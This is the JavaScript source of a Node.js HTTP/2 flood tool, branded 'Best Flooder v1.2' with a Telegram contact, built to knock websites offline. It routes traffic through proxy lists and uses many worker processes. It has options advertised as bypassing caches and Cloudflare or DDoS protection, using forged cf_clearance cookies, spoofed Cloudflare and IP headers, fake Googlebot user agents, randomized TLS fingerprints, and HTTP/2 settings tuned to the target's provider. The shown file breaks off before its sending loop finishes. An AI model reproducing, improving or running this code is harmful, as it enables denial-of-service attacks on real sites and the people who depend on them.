const net = require("net");
const http = require("http");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const crypto = require("crypto");
const dns = require('dns');
const fs = require("fs");
var colors = require("colors");
const util = require('util');
const chalk = require('chalk');
const fetch = require('node-fetch');
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const errorHandler = error => {

        console.log(error);
    
};
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const curves = [
    "X25519",
    "P-256",
    "P-384"
].join(":");
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
].join(":");
function getRandomTLSCiphersuite() {
    const tlsCiphersuites = [
    "TLS_GREASE",
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_CBC_SHA",
    "TLS_RSA_WITH_AES_256_CBC_SHA"
    ];

    const randomCiphersuite = tlsCiphersuites[Math.floor(Math.random() * tlsCiphersuites.length)];

    return randomCiphersuite;
}

const randomTLSCiphersuite = getRandomTLSCiphersuite();
function randstra(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        const randomStringArray = Array.from({
            length
        }, () => {
            const randomIndex = Math.floor(Math.random() * characters.length);
            return characters[randomIndex];
        });

        return randomStringArray.join('');
    }
function randstr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let result = "";
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

const lookupPromise = util.promisify(dns.lookup);

let isp;

async function getIPAndISP(url) {
    try {
        const {
            address
        } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;

            console.log(chalk.cyan('\nISP Information:'));
            console.log(`${chalk.bold('Target URL:')} ${chalk.yellow(url)}`);
            console.log(`${chalk.bold('ISP:')} ${chalk.magenta(isp)}`);

		  		
          } else {
            return;
        }
    } catch (error) {
        return;
    }
}


const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'application/json,text/html;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'application/json,application/xml;q=0.9,text/html;q=0.8,*/*;q=0.7',
    'application/json;q=0.9,application/xml;q=0.8,*/*;q=0.7',
    'text/plain;q=0.9,text/html;q=0.8,*/*;q=0.7',
    'application/pdf,text/html;q=0.8,*/*;q=0.7',
    'image/avif,image/webp,image/apng,image/png,image/jpeg,*/*;q=0.8',
    'text/html,application/xhtml+xml;q=0.8,image/avif,image/webp,*/*;q=0.7',
    'text/html,application/xhtml+xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8',
    '*/*;q=0.8',
];

    cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'private',
    'must-revalidate',
];

const language_header = [
    // English
    "en-US,en;q=0.8",
    "en-US,en;q=0.5",
    "en-US,en;q=0.9",
    "en-US,en;q=0.7",
    "en-US,en;q=0.6",

    // Chinese (Simplified)
    "zh-CN,zh;q=0.8",
    "zh-CN,zh;q=0.5",
    "zh-CN,zh;q=0.9",
    "zh-CN,zh;q=0.7",
    "zh-CN,zh;q=0.6",

    // Chinese (Traditional)
    "zh-TW,zh;q=0.8",
    "zh-TW,zh;q=0.5",
    "zh-TW,zh;q=0.9",

    // Spanish
    "es-ES,es;q=0.8",
    "es-ES,es;q=0.5",
    "es-ES,es;q=0.9",
    "es-ES,es;q=0.7",
    "es-ES,es;q=0.6",

    // French
    "fr-FR,fr;q=0.8",
    "fr-FR,fr;q=0.5",
    "fr-FR,fr;q=0.9",
    "fr-FR,fr;q=0.7",
    "fr-FR,fr;q=0.6",

    // German
    "de-DE,de;q=0.8",
    "de-DE,de;q=0.5",
    "de-DE,de;q=0.9",
    "de-DE,de;q=0.7",
    "de-DE,de;q=0.6",

    // Italian
    "it-IT,it;q=0.8",
    "it-IT,it;q=0.5",
    "it-IT,it;q=0.9",
    "it-IT,it;q=0.7",
    "it-IT,it;q=0.6",

    // Japanese
    "ja-JP,ja;q=0.8",
    "ja-JP,ja;q=0.5",
    "ja-JP,ja;q=0.9",
    "ja-JP,ja;q=0.7",
    "ja-JP,ja;q=0.6",

    // Korean
    "ko-KR,ko;q=0.8",
    "ko-KR,ko;q=0.5",
    "ko-KR,ko;q=0.9",

    // Portuguese (Brazil)
    "pt-BR,pt;q=0.8",
    "pt-BR,pt;q=0.5",
    "pt-BR,pt;q=0.9",

    // Dutch
    "nl-NL,nl;q=0.8",
    "nl-NL,nl;q=0.5",
    "nl-NL,nl;q=0.9",

    // English + Russian
    "en-US,en;q=0.8,ru;q=0.6",
    "en-US,en;q=0.5,ru;q=0.3",
    "en-US,en;q=0.9,ru;q=0.7",
    "en-US,en;q=0.7,ru;q=0.5",
    "en-US,en;q=0.6,ru;q=0.4",

    // English + Chinese
    "en-US,en;q=0.8,zh-CN;q=0.6",
    "en-US,en;q=0.7,zh-TW;q=0.5",

    // English + Spanish
    "en-US,en;q=0.8,es-ES;q=0.6",
    "en-US,en;q=0.7,es-ES;q=0.5",

    // English + French
    "en-US,en;q=0.8,fr-FR;q=0.6",
    "en-US,en;q=0.7,fr-FR;q=0.5",

    // English + German
    "en-US,en;q=0.8,de-DE;q=0.6",
    "en-US,en;q=0.7,de-DE;q=0.5",

    // English + Korean
    "en-US,en;q=0.8,ko-KR;q=0.6",

    // English + Japanese
    "en-US,en;q=0.8,ja-JP;q=0.6",

    // English + Portuguese
    "en-US,en;q=0.8,pt-BR;q=0.6",

    // English + Dutch
    "en-US,en;q=0.8,nl-NL;q=0.6",

    // English + Chinese + Russian
    "en-US,en;q=0.7,zh-CN;q=0.5,ru;q=0.3",

    // English + Spanish + French
    "en-US,en;q=0.7,es-ES;q=0.5,fr-FR;q=0.3",
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;



const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_NO_TICKET |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_TLSEXT_PADDING |
    crypto.constants.SSL_OP_ALL |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
if (process.argv.length < 7) {
    console.clear();

     console.log(
          chalk.white.bold('Telegram:           ') + chalk.blue.bold('    t.me/ThaiDuongScript')
     );
     console.log(
          chalk.white.bold('Product:             ') + chalk.magenta.bold('   Best Flooder v1.2')
     );
     console.log(
          chalk.white.bold('Date:                   ') + chalk.bgWhite.black.bold('30/4/2025')
     );


     console.log(
          chalk.underline.white.bold('\nUsage') + chalk.reset(':')
     );
     console.log(
          chalk.white(`     node ${process.argv[1]} <target> <time> <ratelimit> <threads> <proxy>`)
     );
     console.log(
          chalk.underline.white.bold('\nExample') + chalk.reset(':')
     );
     console.log(
          chalk.italic.white(`     node ${process.argv[1]} https://iristeam.sbs/%RAND% 120 10 10 proxy.txt --cache --referer --origin --cookie --extra --spoof  --query --bypass`)
     );
     console.log(`
 ${chalk.magenta.bold.italic('Options:')}

 ${chalk.blue.blue('BYPASS CACHE FUNCTION :' )}
 %RAND%     ENABLE RANDOM PATH     [Status: ${chalk.green('ONLINE')}]
 --cache    ENABLE BYPASS CACHE    [Status: ${chalk.green('ONLINE')}]
 --referer  ENABLE RANDOM REFERER  [Status: ${chalk.green('ONLINE')}]
 --origin   ENABLE RANDOM ORIGIN   [Status: ${chalk.green('ONLINE')}]
 ${chalk.yellow('BYPASS CLOUDFLARE FUNCTION :' )}
 --cookie   ENABLE COOKIE          [Status: ${chalk.green('ONLINE')}]
 --extra    ENABLE EXTRA HEADER    [Status: ${chalk.green('ONLINE')}]
 --spoof    SPOOF CF HEADER        [Status: ${chalk.green('ONLINE')}]
 --query    ENABLE QUERY STRING    [Status: ${chalk.green('ONLINE')}]
${chalk.red('BYPASS HTTP DDOS FUNCTION :' )}
 --bypass   FAKE GOOGLE BOT        [Status: ${chalk.green('ONLINE')}]
 --debug    RESPONSE STATUS CODE   [Status: ${chalk.green('ONLINE')}]
 Coming soon...!
     `);

    process.exit();
}
const secureProtocol = "TLS_client_method";
const headers = {};


const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    
    
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const targetURL = parsedTarget.host;
const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;


function getSettingsBasedOnISP(isp) {
        const defaultSettings = {
            headerTableSize: 65536,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false,
            maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
            maxFrameSize: 40000,
            enableConnectProtocol: false,
        };
    
        const settings = { ...defaultSettings };
    
        switch (isp) {
        case 'Cloudflare, Inc.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = Math.random() > 0.5 ? "1000" : "10000";
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = Math.random() > 0.25 ? "40000" : "131072";
            settings.maxHeaderListSize = Math.random() > 0.5 ? "262144" : "524288";
            settings.enablePush = false;
            break;
        case 'FDCservers.net':
        case 'OVH SAS':
        case 'VNXCLOUD':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65536;
            settings.maxFrameSize = 16777215;
            settings.maxConcurrentStreams = 128;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Akamai Technologies, Inc.':
        case 'Akamai International B.V.':
            settings.priority = 1;
            settings.headerTableSize = 65536;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxFrameSize = 16384;
            settings.maxHeaderListSize = 32768;
            break;
        case 'Fastly, Inc.':
        case 'Optitrust GmbH':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Ddos-guard LTD':
            settings.priority = 1;
            settings.maxConcurrentStreams = 1;
            settings.initialWindowSize = 65535;
            settings.maxFrameSize = 16777215;
            settings.maxHeaderListSize = 262144;
            break;
        case 'Amazon.com, Inc.':
        case 'Amazon Technologies Inc.':
            settings.priority = 0;
            settings.maxConcurrentStreams = 100;
            settings.initialWindowSize = 65535;
            settings.maxHeaderListSize = 262144;
            break;
        case 'Microsoft Corporation':
        case 'Vietnam Posts and Telecommunications Group':
        case 'VIETNIX':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 8388608;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 4294967295;
            break;
        case 'Google LLC':
            settings.priority = 0;
            settings.headerTableSize = 4096;
            settings.initialWindowSize = 1048576;
            settings.maxFrameSize = 16384;
            settings.maxConcurrentStreams = 100;
            settings.maxHeaderListSize = 137216;
            break;
        default:
            settings.headerTableSize = 65535;
            settings.maxConcurrentStreams = 1000;
            settings.initialWindowSize = 6291456;
            settings.maxHeaderListSize = 261144;
            settings.maxFrameSize = 16384;
            break;
    }

    return settings;
}
if (cluster.isMaster) {
    console.clear()
    
    getIPAndISP(targetURL);


    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

console.log(chalk.yellow('[Reset] Restarting the script') + ` ${chalk.red(RESTART_DELAY)} ms...`);
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
        console.log(chalk.red('\n[Ram] Maximum RAM usage:') + ` ${chalk.red(ramPercentage.toFixed(2))} %`);
            restartScript();
        }
    };
    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder)
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
        const buffer = new Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true)
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

    }
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}


const version = getRandomInt(126, 134);
const version1 = getRandomInt(0, 8);







var brandValue, versionList, fullVersion;
        switch (version) {
            case 126:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(6610, 6790)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 127:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(6610, 6790)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 128:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(6610, 6790)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 129:
                brandValue = `\"Google Chrome\";v=\"${version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(6610, 6790)}.${getRandomInt(10, 100)}`;
                versionList = `\"Google Chrome\";v=\"${fullVersion}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\"`;
                break;
            case 130:
                brandValue = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(6610, 6790)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 131:
                brandValue = `\"Google Chrome\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not_A Brand\";v=\"24\"`;
                fullVersion = `${version}.0.${getRandomInt(6610, 6790)}.${getRandomInt(10, 100)}`;
                brandValue = `\"Google Chrome\";v=\"${fullVersion}\", \"Chromium\";v=\"${fullVersion}\", \"Not_A Brand\";v=\"24.0.0.0\"`;
                versionList = `\"Not?A_Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 132:
                fullVersion = `${version}.0.${getRandomInt(6610, 6790)}.${getRandomInt(10, 100)}`;
                brandValue = `\"Google Chrome\";v=\"${fullVersion}\", \"Chromium\";v=\"${fullVersion}\", \"Not_A Brand\";v=\"8.0.0.0\"`;
                versionList = `\"Not?A_Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 133:
                brandValue = `\"Google Chrome\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not_A Brand\";v=\"99\"`;
                fullVersion = `${version}.0.${getRandomInt(6610, 6790)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 134:
                brandValue = `\"Google Chrome\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not_A Brand\";v=\"24\"`;
                fullVersion = `${version}.0.${getRandomInt(6610, 6790)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not?A_Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            default:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
                fullVersion = `${version}.0.${getRandomInt(6610, 6790)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
        }

        const platforms = [
            "Windows NT 10.0; Win64; x64",
            "X11; Linux x86_64",
        ];

        const platform = platforms[Math.floor(Math.random() * platforms.length)];

        var secChUaPlatform, sec_ch_ua_arch, platformVersion;
        switch (platform) {
            case "Windows NT 10.0; Win64; x64":
                secChUaPlatform = "\"Windows\"";
                sec_ch_ua_arch = "x86";
                platformVersion = "\"10.0.0\"";
                break;
            case "X11; Linux x86_64":
                secChUaPlatform = "\"Linux\"";
                sec_ch_ua_arch = "x86"
                platformVersion = "\"5.15.0\"";
                break;
            default:
                secChUaPlatform = "\"Windows\"";
                sec_ch_ua_arch = "x86";
                platformVersion = "\"10.0.0\"";
                break;
        }
const concu19cm = [
"Dalvik",
"Redmi",
"iPhone",
"Samsung",
"Vivo",
"Oppo",
];
const concudai  = concu19cm[Math.floor(Math.floor(Math.random() * concu19cm.length))];
const FA = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical','Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral',
  'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow',
  'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious',
  'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious',
  'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum',
  'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant',
  'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific',
  'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical','Aberration', 'Benevolence', 'Catalyst', 'Dichotomy', 'Ephemeral',  'Fecund', 'Garrulous', 'Harmony', 'Ineffable', 'Juxtapose', 'Kindle', 'Labyrinthine']

const concubu = FA[Math.floor(Math.floor(Math.random() * FA.length))];
        var user_agent = `${concudai}/5.1.0 (Windows; ${concubu} ${version1}; ${concubu}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;



const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}
function random_string(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}
function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    var interval = 1;

    function randstrr(length) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
        let result = "";
        const charactersLength = characters.length;
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }

    
    

    
 
const method = [
"GET",
"POST",
];
const methods = method[Math.floor(Math.random() * method.length)];
const urihost = [
    'google.com',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'x.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'netflix.com',
    'cloudflare.com',
    'firefox.com',
    'opera.com',
    'brave.com',
    'mozilla.org',
    'tiktok.com'
];
const clength = urihost[Math.floor(Math.random() * urihost.length)];

        if (parsedTarget.path.includes('%RAND%')) {
            parsedTarget.path = parsedTarget.path.replace("%RAND%", random_string(getRandomInt(6, 9)));
        }
let ref
if (process.argv.includes('--referer')) {
ref = "https://www." + clength + "/" + generateRandomString(5,15);
} else {
ref = parsedTarget.host;
}

let ori
if (process.argv.includes('--origin')) {
ori = "https://www." + clength + "/" + generateRandomString(4,8);
} else {
ori = parsedTarget.host;
}






const cookieNames = ['session', 'user', 'token', 'id', 'auth', 'pref', 'theme', 'lang'];
const cookieValues = ['abc123', 'xyz789', 'def456', 'temp', 'guest', 'user', 'admin'];

function generateRandomCookie() {
    const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
    const value = cookieValues[Math.floor(Math.random() * cookieValues.length)] + Math.random().toString(36).substring(7);
    return `${name}=${value}`;
}



let cookies
if (process.argv.includes('--cookie')) {
cookies = `cf_clearance=${generateRandomString(12,15)}_${randstra(1)}.${randstra(3)}.${generateRandomString(4,7)}-${timestampString}-1.0-${generateRandomString(6,8)}+${generateRandomString(11,15)}=randstra(10)`;
} else {
cookies = generateRandomCookie();
}




let extra
if (process.argv.includes('--extra')) {
extra = {
    'Alt-Svc' : `h3=":443";ma=86400`,
    'Cache-Control' : "no-store, no-cache, must-revalidate",
    'Cf-Cache-Status' : "BYPASS",
    'Cf-Ray' :  randstra(15) + "-SIN",
   'Content-Encoding' : "br",
   'Nel' : `{"success_fraction":0,"report_to":"cf-nel","max-age":604800}`,
   'Pragma' : "no-cache",
   'Server' : "cloudflare",
   'Server-Timing' : "cfExtPri",
   'Vary' : "Accept-Encoding",
}
} else {
extra = "";
}


const country = [
  "A1", "A2", "O1", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AO", "AQ", "AR", "AS", "AT", "AU",
  "AW", "AX", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BL", "BM", "BN", "BO",
  "BQ", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK",
  "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CW", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO",
  "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "GA", "GB",
  "GD", "GE", "GF", "GG", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW",
  "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IM", "IN", "IO", "IQ", "IR", "IS",
  "IT", "JE", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ",
  "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "ME", "MF",
  "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX",
  "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA",
  "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO",
  "RS", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN",
  "SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
  "TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
  "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW"
];
 


let headercloudflare 
if (process.argv.includes('--spoof')) {
headercloudflare = {
  'If-Modified-Since': httpTime,
'If-None-Match' : `"${randstr(20)}+${randstr(6)}="`,
'X-Country-Code': country[Math.floor(Math.random() * country.length)],
  'X-Forwarded-Proto':'https',
"x-client-session": "true",
"x-real-ip": parsedProxy[0],
} 
} else {
headercloudflare = "";
}


let query
if (process.argv.includes('--query')) {
query  = '?robots.txt=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
} else {
query = "";
}



const googlebot = [
		`"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"`,
		`"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.90 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"`,
		`"Googlebot/2.1 (+http://www.google.com/bot.html)"`,
];

const bot = googlebot[Math.floor(Math.random() * googlebot.length)];
let dunghoitaisao;
let vcl;
